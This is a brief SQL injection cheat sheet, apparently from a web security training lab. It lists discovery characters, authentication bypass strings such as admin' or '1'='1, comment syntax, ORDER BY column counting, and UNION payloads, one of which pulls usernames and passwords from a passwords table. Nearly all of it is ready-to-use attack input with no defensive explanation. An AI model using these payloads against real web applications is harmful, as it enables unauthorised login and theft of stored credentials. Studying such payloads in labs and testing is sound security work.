# Command Cheat Sheet:
## Discovery Payloads:

' (single quote)
" (double quote)
# (hash)
; (semicolon)
) (closing parenthesis)

## Authentication Bypass:

admin' or '1'='1
' or '1'='1
admin'--
admin')--

Comments:

--  (two dashes with space)
"#" (hash symbol)
--+ (URL encoded version)
%23 (URL encoded hash)

## Column Detection:

' order by 1-- -
' order by 2-- - (increment until error)
cn' UNION select 1,2,3-- -

## UNION Injection:

cn' UNION select 1,@@version,3,4-- -
1' UNION SELECT username, password from passwords-- '
